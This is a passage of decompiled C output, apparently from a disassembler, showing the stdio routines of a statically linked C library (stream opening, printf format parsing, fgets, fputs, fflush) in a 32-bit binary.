    *(_WORD *)v8 = 0x2000;
    *(_DWORD *)(v8 + 8) = 0;
    _stdio_init_mutex((char *)(v8 + 56));
  }
  if ( fd < 0 )
  {
    if ( fd != -1 )
      BYTE1(v6) |= 0x80u;
    v9 = _libc_open(filename, v6, 438);
    *(_DWORD *)(v4 + 4) = v9;
    if ( v9 < 0 )
      goto LABEL_5;
  }
  else
  {
    *(_DWORD *)(v4 + 4) = fd;
    if ( (((v6 & 0x8003) + 1) & (unsigned int)(filename + 1)) != (v6 & 0x8003) + 1
      || (unsigned __int16)v6 & ~(_WORD)filename & 0x400 && _libc_fcntl(fd, 4, (struct flock *)0x400) )
    {
      goto LABEL_4;
    }
    v6 |= (unsigned __int16)((unsigned __int16)filename & 0x8000);
  }
  *(_WORD *)v4 &= 0x2000u;
  v10 = v6;
  LOWORD(v6) = v6 & 0x8400;
  v11 = 16 * (((v10 & 3) + 1) ^ 3) | *(_DWORD *)v4 | v6;
  *(_WORD *)v4 = v11;
  v12 = (int *)_errno_location();
  v13 = *v12;
  *(_WORD *)v4 = ((unsigned __int16)isatty(*(_DWORD *)(v4 + 4)) << 8) | v11;
  *v12 = v13;
  if ( !*(_DWORD *)(v4 + 8) )
  {
    v14 = malloc(v4, v13, 0x1000u);
    *(_DWORD *)(v4 + 8) = v14;
    if ( v14 )
    {
      *(_WORD *)v4 |= 0x4000u;
      *(_DWORD *)(v4 + 12) = v14 + 4096;
    }
    else
    {
      *(_DWORD *)(v4 + 12) = 0;
    }
  }
  v15 = *(_DWORD *)(v4 + 8);
  *(_BYTE *)(v4 + 2) = 0;
  *(_DWORD *)(v4 + 24) = v15;
  *(_DWORD *)(v4 + 28) = v15;
  *(_DWORD *)(v4 + 16) = v15;
  *(_DWORD *)(v4 + 20) = v15;
  *(_DWORD *)(v4 + 44) = 0;
  v16 = (*(_BYTE *)(v4 + 1) & 0x20) == 0;
  *(_DWORD *)(v4 + 52) = stdio_user_locking;
  if ( !v16 )
  {
    pthread_cleanup_push_defer(&v19, (int)pthread_mutex_unlock, (int)&stdio_openlist_del_lock);
    pthread_mutex_lock((int)&stdio_openlist_del_lock);
    pthread_cleanup_push_defer(&v18, (int)pthread_mutex_unlock, (int)&stdio_openlist_add_lock);
    pthread_mutex_lock((int)&stdio_openlist_add_lock);
    *(_DWORD *)(v4 + 32) = stdio_openlist;
    stdio_openlist = (int *)v4;
    pthread_cleanup_pop_restore(v4, (int)&v18, 1);
    pthread_cleanup_pop_restore(v4, (int)&v19, 1);
  }
  return v4;
}
// 806199C: using guessed type int *stdio_openlist;
// 80619D0: using guessed type int stdio_user_locking;

//----- (08050588) --------------------------------------------------------
_BOOL4 stdio_init()
{
  _DWORD *v0; // eax@1
  _DWORD *v1; // edi@1
  __int16 v2; // si@1
  int v3; // ebp@1
  __int16 v4; // si@1
  _BOOL4 result; // eax@1

  v0 = _errno_location();
  v1 = v0;
  v2 = stdio_streams;
  v3 = *v0;
  LOWORD(stdio_streams) = ((1 - (unsigned __int16)isatty(0)) << 8) ^ v2;
  v4 = dword_8061A30;
  result = isatty(1);
  LOWORD(dword_8061A30) = ((1 - (_WORD)result) << 8) ^ v4;
  *v1 = v3;
  return result;
}
// 80619E0: using guessed type int stdio_streams;
// 8061A30: using guessed type int dword_8061A30;

//----- (080505E9) --------------------------------------------------------
char *__cdecl _stdio_init_mutex(char *a1)
{
  return memcpy(a1, (char *)&_stdio_mutex_initializer_3991, 0x18u);
}

//----- (08050600) --------------------------------------------------------
int stdio_term()
{
  int *i; // ebx@1
  int v1; // eax@3
  int *j; // ebx@6
  int v4; // [esp+10h] [ebp-Ch]@0

  _stdio_init_mutex((char *)&stdio_openlist_add_lock);
  _stdio_init_mutex((char *)&stdio_openlist_del_lock);
  for ( i = stdio_openlist; i; i = (int *)i[8] )
  {
    if ( pthread_mutex_trylock((int)(i + 14)) )
    {
      v1 = i[2];
      *(_WORD *)i = 48;
      i[6] = v1;
      i[7] = v1;
      i[4] = v1;
      i[5] = v1;
    }
    i[13] = 1;
    _stdio_init_mutex((char *)i + 56);
  }
  for ( j = stdio_openlist; j; j = (int *)j[8] )
  {
    if ( *(_BYTE *)j & 0x40 )
      _stdio_wcommit((int)j);
  }
  return v4;
}
// 806199C: using guessed type int *stdio_openlist;

//----- (08050688) --------------------------------------------------------
int __cdecl _stdio_wcommit(int a1)
{
  void *v1; // edx@1
  size_t v2; // eax@1

  v1 = *(void **)(a1 + 8);
  v2 = *(_DWORD *)(a1 + 16) - (_DWORD)v1;
  if ( *(void **)(a1 + 16) != v1 )
  {
    *(_DWORD *)(a1 + 16) = v1;
    _stdio_WRITE(a1, v1, v2);
  }
  return *(_DWORD *)(a1 + 16) - *(_DWORD *)(a1 + 8);
}

//----- (080506B4) --------------------------------------------------------
int __usercall charpad@<eax>(size_t a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  size_t v3; // edi@1
  int v4; // esi@1
  int v5; // ebx@1
  char v7; // [esp+Fh] [ebp-Dh]@1

  v3 = a1;
  v4 = a3;
  v5 = a3;
  v7 = a2;
  while ( v5 && _stdio_fwrite(&v7, (void *)1, v3) == 1 )
    --v5;
  return v4 - v5;
}

//----- (080506EA) --------------------------------------------------------
int __cdecl fp_out_narrow(size_t len, int a2, void *addr, void *a4)
{
  int v4; // ebp@1
  void *v5; // ebx@1
  unsigned int v6; // eax@2
  char *v7; // ebx@2
  void *v8; // esi@2
  size_t v9; // eax@5

  v4 = 0;
  v5 = addr;
  if ( (char)a2 < 0 )
  {
    v6 = strlen((const char *)a4);
    v7 = (char *)addr - v6;
    v8 = (void *)v6;
    if ( (signed int)((signed int)addr - v6) > 0 )
    {
      v4 = charpad(len, a2 & 0x7F, (int)v7);
      if ( (char *)v4 != v7 )
        return v4;
    }
    v5 = v8;
  }
  v9 = 0;
  if ( (signed int)v5 > 0 )
    v9 = _stdio_fwrite(a4, v5, len);
  v4 += v9;
  return v4;
}

//----- (08050754) --------------------------------------------------------
int __cdecl vfprintf_internal(size_t len, void *a2, int a3)
{
  _BYTE *v3; // ebx@1
  void *v4; // ebx@2
  void *v5; // eax@2
  _BYTE *i; // edx@4
  size_t v7; // eax@9
  int v8; // esi@9
  int v9; // edi@15
  char *v10; // edx@15
  int v11; // eax@17
  int v12; // ecx@17
  int v13; // esi@23
  signed int v14; // ebx@23
  signed int v15; // ebp@29
  signed int v16; // edx@35
  __int64 v17; // rax@37
  char *v18; // eax@37
  char *v19; // edi@37
  char *v20; // edx@44
  char *v21; // esi@44
  int v22; // ebx@63
  long double v23; // fst7@66
  int v24; // eax@68
  int v25; // ecx@73
  int v26; // eax@77
  signed int v27; // edx@82
  unsigned int *v28; // eax@87
  unsigned int v29; // edx@91
  size_t v30; // eax@102
  unsigned int v31; // edx@107
  void *v32; // ebx@109
  size_t v33; // eax@109
  signed int v35; // [esp+1Ch] [ebp-16Ch]@2
  char v36; // [esp+23h] [ebp-165h]@33
  int v37; // [esp+24h] [ebp-164h]@93
  void *v38; // [esp+2Ch] [ebp-15Ch]@1
  int v39; // [esp+30h] [ebp-158h]@33
  unsigned int v40; // [esp+34h] [ebp-154h]@93
  int v41; // [esp+3Ch] [ebp-14Ch]@21
  char v42; // [esp+40h] [ebp-148h]@34
  int v43; // [esp+44h] [ebp-144h]@15
  int v44; // [esp+48h] [ebp-140h]@17
  unsigned int v45; // [esp+4Ch] [ebp-13Ch]@20
  int v46; // [esp+50h] [ebp-138h]@36
  unsigned __int8 v47; // [esp+52h] [ebp-136h]@15
  char v48[108]; // [esp+7Ch] [ebp-10Ch]@15
  char v49; // [esp+E8h] [ebp-A0h]@44
  char v50; // [esp+E9h] [ebp-9Fh]@85
  char v51; // [esp+167h] [ebp-21h]@37
  int v52; // [esp+168h] [ebp-20h]@71
  int v53; // [esp+170h] [ebp-18h]@15
  int v54[5]; // [esp+174h] [ebp-14h]@18

  v3 = a2;
  if ( ppfs_init(&v38, a2) >= 0 )
  {
    ppfs_prepargs(&v38, a3);
    v35 = 0;
    for ( i = a2; ; i = v38 )
    {
      while ( 1 )
      {
        while ( *v3 && *v3 != 37 )
          ++v3;
        if ( v3 != i )
        {
          v7 = 0;
          v8 = v3 - i;
          if ( v3 - i > 0 )
            v7 = _stdio_fwrite(i, (void *)(v3 - i), len);
          if ( v7 != v8 )
            return -1;
          v35 += v8;
        }
        if ( !*v3 )
          return v35;
        i = v3 + 1;
        if ( v3[1] != 37 )
          break;
        v3 += 2;
      }
      v38 = v3 + 1;
      v53 = 0;
      ppfs_parsespec((int)&v38);
      ppfs_setargs((int)&v38);
      v9 = v47;
      v10 = v48;
      if ( v43 > 0 )
        v10 = &v48[12 * v47 - 12];
      v11 = 0;
      v12 = v44;
      while ( v11 < v12 )
      {
        v54[v11] = (int)v10;
        v10 += 12;
        ++v11;
      }
      if ( !v45 )
      {
        store_inttype(*(_BYTE **)v54[0], v41 & 0xF00, v35);
        goto LABEL_115;
      }
      if ( v45 > 7 )
      {
        if ( v45 <= 0xF )
        {
          if ( BYTE1(v41) & 8 )
            v23 = *(long double *)v54[0];
          else
            v23 = *(double *)v54[0];
          v24 = fpmaxtostr(len, v23, (int)&v39, (int)fp_out_narrow);
          if ( v24 < 0 )
            return -1;
          v35 += v24;
          goto LABEL_115;
        }
        if ( v45 <= 0x11 )
        {
          v52 = 0;
          if ( v45 == 17 )
          {
            v53 = *(_DWORD *)v54[0];
            if ( v53 )
            {
              v25 = -1;
              if ( v39 >= 0 )
                v25 = v39;
              v21 = (char *)wcsrtombs((char *)&v53, (char *)&v53, v25);
              if ( v21 == (char *)-1 )
                return -1;
              v19 = 0;
              goto LABEL_90;
            }
LABEL_89:
            v19 = "(null)";
            v21 = (char *)6;
          }
          else
          {
            v26 = wcrtomb(&v49, *(_DWORD *)v54[0]);
            v21 = (char *)v26;
            if ( v26 == -1 )
              return -1;
            v19 = &v49;
            *(&v49 + v26) = 0;
          }
LABEL_90:
          v22 = 0;
          v15 = 11;
          v36 = 32;
          goto LABEL_91;
        }
        if ( v45 > 0x13 )
        {
          if ( v45 != 20 )
            return -1;
          v28 = (unsigned int *)_errno_location();
          v19 = _glibc_strerror_r(*v28, &v49, 0x80u);
        }
        else
        {
          if ( v45 != 19 )
          {
            v19 = &v49;
            v21 = (char *)1;
            v49 = *(_DWORD *)v54[0];
            v50 = 0;
            goto LABEL_90;
          }
          v19 = *(char **)v54[0];
          if ( !*(_DWORD *)v54[0] )
            goto LABEL_89;
        }
        v27 = -1;
        if ( v39 >= 0 )
          v27 = v39;
        v21 = (char *)strnlen(v19, v27);
        goto LABEL_90;
      }
      v13 = byte_805A6D0[v45];
      LOBYTE(v14) = 87;
      if ( v13 == 10 )
      {
        v14 = (v41 & 0x20u) < 1 ? 87 : 44;
        if ( v41 & 0x40 )
          LOBYTE(v14) = v14 | 0x80;
      }
      if ( v45 > 5 )
      {
        v13 = -v13;
      }
      else if ( v45 == 3 )
      {
        LOBYTE(v14) = 55;
      }
      else
      {
        v15 = 6;
        if ( v45 == 1 )
          goto LABEL_33;
      }
      v15 = 11;
LABEL_33:
      v36 = 32;
      if ( v39 < 0 )
        v36 = v42;
      v16 = 1024;
      if ( v45 != 1 )
        v16 = *(&v46 + v9) & 0xF00;
      v17 = load_inttype(v16, v54[0], v13);
      v18 = uintmaxtostr(&v51, v17, v13, v14);
      v19 = v18;
      if ( v45 > 5 )
      {
        if ( *v18 == 45 )
        {
          v41 |= 2u;
          v19 = v18 + 1;
          v15 = 2;
        }
        else if ( v41 & 2 )
        {
          v15 = 0;
        }
        else if ( v41 & 1 )
        {
          v15 = 4;
        }
      }
      v20 = (char *)v39;
      v21 = (char *)(&v49 - v19 + 127);
      if ( v39 < 0 )
        v20 = (char *)1;
      if ( v41 & 0x10 )
      {
        if ( v45 <= 2 )
          v15 = 6;
        if ( v45 == 3 )
        {
          v15 = 9;
        }
        else if ( v45 == 4 && v20 <= v21 )
        {
          v20 = (char *)1;
          if ( *v19 != 48 )
            v20 = (char *)(&v49 - v19 + 128);
        }
      }
      if ( *v19 == 48 )
      {
        if ( v15 > 5 )
          v15 = 11;
        if ( v45 == 1 )
        {
          v19 = "(nil)";
          v21 = (char *)5;
LABEL_88:
          v22 = 0;
          goto LABEL_91;
        }
        if ( !v20 )
        {
          v21 = 0;
          goto LABEL_88;
        }
      }
      if ( v20 <= v21 )
        goto LABEL_88;
      v22 = v20 - v21;
LABEL_91:
      v29 = (unsigned int)&v21[v22];
      if ( v15 != 11 )
        v29 += (v15 > 5) + 1;
      v37 = 0;
      if ( v40 > v29 )
        v37 = v40 - v29;
      v35 += v29 + v37;
      if ( v36 == 48 )
      {
        v22 += v37;
        v37 = 0;
      }
      if ( !(v41 & 8) )
      {
        if ( charpad(len, 32, v37) != v37 )
          return -1;
        v37 = 0;
      }
      fputs_unlocked(&prefix_4202[v15], len);
      if ( charpad(len, 48, v22) != v22 )
        return -1;
      if ( v53 )
      {
        v52 = 0;
        while ( v21 )
        {
          v31 = (unsigned int)v21;
          if ( (unsigned int)v21 > 0x80 )
            v31 = 128;
          v32 = (void *)wcsrtombs(&v49, (char *)&v53, v31);
          v33 = 0;
          if ( v32 )
            v33 = _stdio_fwrite(&v49, v32, len);
          if ( (void *)v33 != v32 )
            return -1;
          v21 -= v33;
        }
      }
      else
      {
        v30 = 0;
        if ( v21 )
          v30 = _stdio_fwrite(v19, v21, len);
        if ( (char *)v30 != v21 )
          return -1;
      }
      if ( charpad(len, 32, v37) != v37 )
        return -1;
LABEL_115:
      v3 = v38;
    }
  }
  v4 = v38;
  v5 = (void *)strlen((const char *)v38);
  v35 = -1;
  if ( v5 )
  {
    _stdio_fwrite(v4, v5, len);
    v35 = -1;
  }
  return v35;
}
// 8050754: using guessed type char var_10C[108];
// 8050754: using guessed type int var_14[5];

//----- (08050CFC) --------------------------------------------------------
signed int __cdecl ppfs_init(_DWORD *a1, _BYTE *a2)
{
  _DWORD *v2; // eax@1
  signed int v3; // edx@1
  _BYTE *v4; // eax@3

  memset(a1, 0, 0xBCu);
  --a1[6];
  *a1 = a2;
  v2 = a1 + 10;
  v3 = 9;
  do
  {
    *v2 = 8;
    ++v2;
    --v3;
  }
  while ( v3 );
  v4 = a2;
  while ( *v4 )
  {
    if ( *v4 != 37 || (++v4, *v4 == 37) )
    {
      ++v4;
    }
    else
    {
      *a1 = v4;
      if ( ppfs_parsespec((int)a1) < 0 )
        return -1;
      v4 = (_BYTE *)*a1;
    }
  }
  *a1 = a2;
  return 0;
}

//----- (08050D6C) --------------------------------------------------------
int __cdecl ppfs_prepargs(_DWORD *a1, int a2)
{
  int v2; // esi@1
  int v4; // [esp+0h] [ebp-Ch]@0

  v2 = a1[6];
  a1[19] = a2;
  if ( v2 > 0 )
  {
    a1[7] = v2;
    a1[6] = 0;
    a1[1] = 0;
    a1[2] = 0;
    ppfs_setargs((int)a1);
    a1[6] = v2;
  }
  return v4;
}

//----- (08050DB0) --------------------------------------------------------
int __cdecl ppfs_setargs(int a1)
{
  long double *v1; // ebx@1
  int *v2; // eax@3
  int v3; // eax@3
  int *v4; // eax@5
  int v5; // eax@5
  int i; // esi@6
  signed int v7; // eax@7
  int *v8; // edx@8
  int v9; // eax@18
  double *v10; // edx@12
  long double *v11; // edx@17
  int result; // eax@29

  v1 = (long double *)(a1 + 80);
  if ( !*(_DWORD *)(a1 + 24) )
  {
    if ( *(_DWORD *)(a1 + 8) == 0x80000000 )
    {
      v2 = *(int **)(a1 + 76);
      *(_DWORD *)(a1 + 76) = v2 + 1;
      v3 = *v2;
      *(_DWORD *)(a1 + 80) = v3;
      *(_DWORD *)(a1 + 8) = v3;
    }
    if ( *(_DWORD *)(a1 + 4) == 0x80000000 )
    {
      v4 = *(int **)(a1 + 76);
      *(_DWORD *)(a1 + 76) = v4 + 1;
      v5 = *v4;
      *(_DWORD *)(a1 + 80) = v5;
      *(_DWORD *)(a1 + 4) = v5;
    }
    for ( i = 0; ; ++i )
    {
      if ( i >= *(_DWORD *)(a1 + 28) )
        goto LABEL_29;
      v7 = *(_DWORD *)(a1 + 4 * i + 40);
      if ( v7 != 8 )
        break;
LABEL_22:
      ;
    }
    v8 = *(int **)(a1 + 76);
    if ( v7 > 8 )
    {
      if ( v7 != 1024 && v7 > 1024 )
      {
        if ( v7 == 2048 )
        {
          *(_DWORD *)(a1 + 76) = v8 + 2;
          v9 = *v8;
          *((_DWORD *)v1 + 1) = v8[1];
LABEL_20:
          *(_DWORD *)v1 = v9;
          goto LABEL_21;
        }
        if ( v7 == 2055 )
        {
          v11 = *(long double **)(a1 + 76);
          *(_DWORD *)(a1 + 76) = v11 + 1;
          *v1 = *v11;
          goto LABEL_21;
        }
      }
    }
    else if ( v7 != 2 && v7 > 2 && v7 == 7 )
    {
      v10 = *(double **)(a1 + 76);
      *(_DWORD *)(a1 + 76) = v10 + 1;
      *(double *)v1 = *v10;
LABEL_21:
      ++v1;
      goto LABEL_22;
    }
    *(_DWORD *)(a1 + 76) = v8 + 1;
    v9 = *v8;
    goto LABEL_20;
  }
  if ( *(_DWORD *)(a1 + 8) == 0x80000000 )
    *(_DWORD *)(a1 + 8) = LODWORD(v1[*(unsigned __int8 *)(a1 + 36) - 1]);
  if ( *(_DWORD *)(a1 + 4) == 0x80000000 )
    *(_DWORD *)(a1 + 4) = LODWORD(v1[*(unsigned __int8 *)(a1 + 37) - 1]);
LABEL_29:
  result = *(_DWORD *)(a1 + 8);
  if ( result < 0 )
  {
    *(_DWORD *)(a1 + 16) |= 8u;
    *(_DWORD *)(a1 + 16) &= 0xFFFFFFFE;
    result = -result;
    *(_DWORD *)(a1 + 8) = result;
    *(_DWORD *)(a1 + 20) = 32;
  }
  return result;
}

//----- (08050EC0) --------------------------------------------------------
int __usercall promoted_size@<eax>(int a1@<eax>)
{
  char *v1; // edx@1

  v1 = type_sizes;
  do
    v1 -= 2;
  while ( *(signed __int16 *)v1 != a1 && v1 > "\b" );
  return (unsigned __int8)type_sizes[(v1 - "\b") >> 1];
}

//----- (08050EE9) --------------------------------------------------------
int __cdecl ppfs_parsespec(int a1)
{
  int v1; // edi@1
  char *v2; // edx@2
  signed int v3; // ebp@3
  char *v4; // esi@4
  unsigned int v5; // esi@5
  char *v6; // edx@6
  int v7; // eax@6
  int v8; // ebx@14
  char v9; // al@18
  int v10; // ecx@18
  signed int i; // ecx@33
  char v12; // al@34
  const char *v13; // edx@50
  int v14; // ebx@56
  const char *v15; // ecx@57
  int v16; // edx@57
  int v17; // edx@59
  char *v18; // ecx@62
  char *v19; // eax@64
  int v20; // eax@66
  int v21; // ebp@70
  int v22; // eax@72
  int v23; // edi@77
  int v24; // eax@77
  int v25; // ebx@80
  int result; // eax@88
  int v27; // [esp+Ch] [ebp-60h]@10
  signed int v28; // [esp+10h] [ebp-5Ch]@10
  int v29; // [esp+14h] [ebp-58h]@1
  int v30; // [esp+18h] [ebp-54h]@77
  char v31; // [esp+24h] [ebp-48h]@6
  char v32; // [esp+25h] [ebp-47h]@9
  char v33; // [esp+43h] [ebp-29h]@9
  int v34; // [esp+44h] [ebp-28h]@1
  int v35; // [esp+48h] [ebp-24h]@1
  int v36; // [esp+4Ch] [ebp-20h]@23
  int v37; // [esp+50h] [ebp-1Ch]@1
  int v38; // [esp+54h] [ebp-18h]@1
  int v39; // [esp+58h] [ebp-14h]@57
  char v40; // [esp+5Ch] [ebp-10h]@87

  v34 = 0;
  v35 = 0;
  v37 = 8;
  v38 = 8;
  v29 = *(_DWORD *)(a1 + 24);
  v1 = *(_DWORD *)(a1 + 16) & 0x80;
  if ( v1 )
  {
    v5 = 0;
    do
    {
      v6 = *(char **)a1;
      v7 = *(_DWORD *)(*(_DWORD *)a1 + 4 * v5 - 4);
      *(&v31 + v5) = v7;
      if ( (char)v7 != *(_DWORD *)&v6[4 * v5 - 4] )
        goto LABEL_89;
      if ( !(_BYTE)v7 )
        break;
      ++v5;
    }
    while ( v5 <= 0x1F );
    v33 = 0;
    v2 = &v32;
  }
  else
  {
    v2 = *(char **)a1;
  }
  v27 = 0;
  v28 = 0;
  while ( 1 )
  {
    v4 = v2;
    if ( *v2 == 42 )
    {
      v4 = v2 + 1;
      *(&v37 - v28) = 0;
    }
    v8 = 0;
    while ( 1 )
    {
      v9 = *v4;
      v10 = *v4;
      if ( !(*((_BYTE *)_ctype_b + 2 * v10) & 8) )
        break;
      if ( v8 <= 4094 )
        v8 = 10 * v8 + v10 - 48;
      ++v4;
    }
    if ( *(v2 - 1) != 37 )
      break;
    if ( v9 != 36 || v8 <= 0 )
    {
      if ( v29 > 0 )
      {
        if ( v9 != 109 )
          goto LABEL_89;
        break;
      }
      if ( v4 > v2 && *v2 != 48 )
      {
        v29 = 0;
        break;
      }
      v29 = 0;
    }
    else
    {
      v2 = v4 + 1;
      if ( !v29 )
        goto LABEL_89;
      v36 = v8;
      if ( v8 > v29 )
        v29 = v8;
    }
    v4 = v2;
LABEL_33:
    v2 = " +0-#'I";
    for ( i = 1; ; i *= 2 )
    {
      v12 = *v2++;
      if ( *v4 == v12 )
      {
        ++v4;
        v1 |= i;
        goto LABEL_33;
      }
      if ( !*v2 )
        break;
    }
    v8 = 0;
    v1 &= ~((v1 & 0xA) >> 1);
    if ( *(v4 - 1) == 37 )
      break;
LABEL_11:
    v2 = v4;
  }
  if ( *v2 == 42 )
  {
    if ( v29 )
    {
      if ( *v4 != 36 || v8 <= 0 )
        goto LABEL_89;
      ++v4;
      *(&v34 - v28) = v8;
    }
    else if ( v2 + 1 != v4 )
    {
      goto LABEL_89;
    }
    v8 = 2147483648;
  }
  if ( v28 )
  {
    v3 = v8;
    goto LABEL_50;
  }
  if ( *v4 == 46 )
  {
    ++v4;
    v27 = v8;
    v28 = -1;
    goto LABEL_11;
  }
  v27 = v8;
  v3 = -1;
LABEL_50:
  v13 = "hlLjztqZ";
  while ( *v4 != *v13 )
  {
    if ( !*++v13 )
      goto LABEL_53;
  }
  ++v4;
LABEL_53:
  if ( v13 - "hlLjztqZ" <= 1 && *v4 == *v13 )
  {
    v13 += 9;
    ++v4;
  }
  v14 = v13[9] << 8;
  if ( !*v4 )
    goto LABEL_89;
  v15 = "npxXoudifFeEgGaACScs";
  v16 = v39;
  while ( *v4 != *v15 )
  {
    if ( !*++v15 )
      goto LABEL_66;
  }
  v17 = v15 - "npxXoudifFeEgGaACScs";
  if ( v15 - "npxXoudifFeEgGaACScs" > 17 && BYTE1(v14) & 4 )
    v17 -= 2;
  v18 = (char *)&unk_805A70B;
  *(_DWORD *)(a1 + 32) = v17;
  do
    ++v18;
  while ( v17 > *v18 );
  v19 = v18;
  v15 = "npxXoudifFeEgGaACScs";
  v16 = spec_and_mask_4207[v19 - (char *)&spec_ranges_4205] & (v14 | spec_or_mask_4206[v19 - (char *)&spec_ranges_4205]);
LABEL_66:
  v39 = v16;
  v20 = *v4;
  *(_DWORD *)(a1 + 4) = v3;
  *(_DWORD *)(a1 + 12) = v20;
  *(_DWORD *)(a1 + 28) = 1;
  *(_DWORD *)(a1 + 8) = v27;
  *(_DWORD *)(a1 + 20) = (v1 & 4u) < 1 ? 32 : 48;
  *(_DWORD *)(a1 + 16) = v14 & 0xF00 | v1 & 0xFFFFFFFB;
  if ( *v15 )
  {
LABEL_69:
    if ( v29 <= 0 )
    {
      *(_BYTE *)(a1 + 38) = 1;
      memcpy((char *)(a1 + 40), (char *)&v39, 4 * *(_DWORD *)(a1 + 28));
    }
    else
    {
      v21 = 0;
      do
      {
        if ( v21 > 2 )
        {
          v22 = v36 + v21 - 2;
        }
        else
        {
          v22 = *(&v34 + v21);
          *(_BYTE *)(v21 + a1 + 36) = v22;
          v22 = (unsigned __int8)v22;
        }
        if ( v22 > v29 )
        {
          if ( v22 > 9 )
            goto LABEL_89;
          v29 = v22;
        }
        v30 = v22 - 1;
        v23 = *(&v37 + v21);
        v24 = *(_DWORD *)(a1 + 4 * (v22 - 1) + 40);
        if ( v23 != 8 )
        {
          if ( v24 == 8 || v24 == v23 || (v25 = promoted_size(v24), v25 <= promoted_size(v23)) )
            *(_DWORD *)(a1 + 4 * v30 + 40) = *(&v37 + v21);
        }
        ++v21;
      }
      while ( v21 < *(_DWORD *)(a1 + 28) + 2 );
    }
    *(_DWORD *)(a1 + 24) = v29;
    if ( *(_BYTE *)(a1 + 16) < 0 )
      *(_DWORD *)a1 += 4 * (v4 - &v40) + 224;
    else
      *(_DWORD *)a1 = v4 + 1;
    result = *(_DWORD *)(a1 + 28) + 2;
  }
  else
  {
    if ( *v4 == 109 )
    {
      *(_DWORD *)(a1 + 32) = 20;
      *(_DWORD *)(a1 + 28) = 0;
      goto LABEL_69;
    }
LABEL_89:
    result = -1;
  }
  return result;
}
// 8061BE0: using guessed type void *_ctype_b;

//----- (080512B0) --------------------------------------------------------
int __usercall feof@<eax>(off_t a1@<ebp>, int *a2)
{
  int v2; // edi@1
  int v3; // ebx@3
  char v5; // [esp+10h] [ebp-1Ch]@2

  v2 = a2[13];
  if ( !v2 )
  {
    pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, (int)(a2 + 14));
    pthread_mutex_lock((int)(a2 + 14));
  }
  v3 = *a2;
  if ( !v2 )
    pthread_cleanup_pop_restore(a1, (int)&v5, 1);
  return v3 & 4;
}

//----- (08051304) --------------------------------------------------------
char *__usercall fgets@<eax>(off_t a1@<ebp>, char *a2, int a3, unsigned int *a4)
{
  unsigned int v4; // edi@1
  char *v5; // ebx@3
  char v7; // [esp+10h] [ebp-1Ch]@2

  v4 = a4[13];
  if ( !v4 )
  {
    pthread_cleanup_push_defer(&v7, (int)pthread_mutex_unlock, (int)(a4 + 14));
    pthread_mutex_lock((int)(a4 + 14));
  }
  v5 = fgets_unlocked(a2, a3, a4);
  if ( !v4 )
    pthread_cleanup_pop_restore(a1, (int)&v7, 1);
  return v5;
}

//----- (08051368) --------------------------------------------------------
signed int __usercall fputs@<eax>(off_t ebp0@<ebp>, char *a1, size_t a2)
{
  int v3; // edi@1
  signed int v4; // ebx@3
  char v6; // [esp+10h] [ebp-1Ch]@2

  v3 = *(_DWORD *)(a2 + 52);
  if ( !v3 )
  {
    pthread_cleanup_push_defer(&v6, (int)pthread_mutex_unlock, a2 + 56);
    pthread_mutex_lock(a2 + 56);
  }
  v4 = fputs_unlocked(a1, a2);
  if ( !v3 )
    pthread_cleanup_pop_restore(ebp0, (int)&v6, 1);
  return v4;
}

//----- (080513C8) --------------------------------------------------------
int __usercall stdio_openlist_dec_use@<eax>(unsigned __int32 a1@<ebp>)
{
  int *v1; // esi@3
  int *i; // edx@3
  int *v3; // ebx@4
  char v5; // [esp+14h] [ebp-28h]@3
  char v6; // [esp+24h] [ebp-18h]@1

  pthread_cleanup_push_defer(&v6, (int)pthread_mutex_unlock, (int)&stdio_openlist_del_lock);
  pthread_mutex_lock((int)&stdio_openlist_del_lock);
  if ( stdio_openlist_use_count == 1 && stdio_openlist_del_count > 0 )
  {
    v1 = 0;
    pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, (int)&stdio_openlist_add_lock);
    pthread_mutex_lock((int)&stdio_openlist_add_lock);
    for ( i = stdio_openlist; i; i = v3 )
    {
      v3 = (int *)i[8];
      if ( (*(_WORD *)i & 0x8030) == 48 )
      {
        if ( v1 )
          v1[8] = (int)v3;
        else
          stdio_openlist = (int *)i[8];
        if ( *((_BYTE *)i + 1) & 0x20 )
          free(a1, i);
      }
      else
      {
        v1 = i;
      }
    }
    pthread_cleanup_pop_restore(a1, (int)&v5, 1);
    stdio_openlist_del_count = 0;
  }
  --stdio_openlist_use_count;
  return pthread_cleanup_pop_restore(a1, (int)&v6, 1);
}
// 806199C: using guessed type int *stdio_openlist;
// 8068240: using guessed type int stdio_openlist_use_count;
// 8068244: using guessed type int stdio_openlist_del_count;

//----- (080514AC) --------------------------------------------------------
signed int __cdecl fflush_unlocked(int a1)
{
  signed int v1; // ebp@1
  signed int v2; // edi@3
  int *v3; // esi@3
  char v5; // [esp+1Ch] [ebp-20h]@3

  v1 = 0;
  if ( (int **)a1 != &stdio_openlist && (v1 = 256, a1) )
  {
    v2 = 0;
    if ( *(_BYTE *)a1 & 0x40 )
    {
      v2 = -1;
      if ( !_stdio_wcommit(a1) )
      {
        *(_WORD *)a1 &= 0xFFBFu;
        *(_DWORD *)(a1 + 28) = *(_DWORD *)(a1 + 8);
        v2 = 0;
      }
    }
  }
  else
  {
    v2 = 0;
    pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, (int)&stdio_openlist_del_lock);
    pthread_mutex_lock((int)&stdio_openlist_del_lock);
    ++stdio_openlist_use_count;
    pthread_cleanup_pop_restore(v1, (int)&v5, 1);
    pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, (int)&stdio_openlist_add_lock);
    pthread_mutex_lock((int)&stdio_openlist_add_lock);
    v3 = stdio_openlist;
    pthread_cleanup_pop_restore(v1, (int)&v5, 1);
    while ( v3 )
    {
      if ( *(_BYTE *)v3 & 0x40 )
      {
        if ( stdio_user_locking != 2 )
        {
          pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, (int)(v3 + 14));
          pthread_mutex_lock((int)(v3 + 14));
        }
        if ( !(((unsigned __int16)(*(_WORD *)v3 | v1) ^ 0x140) & 0x340) )
        {
          if ( _stdio_wcommit((int)v3) )
          {
            v2 = -1;
          }
          else
          {
            *(_WORD *)v3 &= 0xFFBFu;
            v3[7] = v3[2];
          }
        }
        if ( stdio_user_locking != 2 )
          pthread_cleanup_pop_restore(v1, (int)&v5, 1);
      }
      v3 = (int *)v3[8];
    }
    stdio_openlist_dec_use(v1);
  }
  return v2;
}
// 806199C: using guessed type int *stdio_openlist;
// 80619D0: using guessed type int stdio_user_locking;
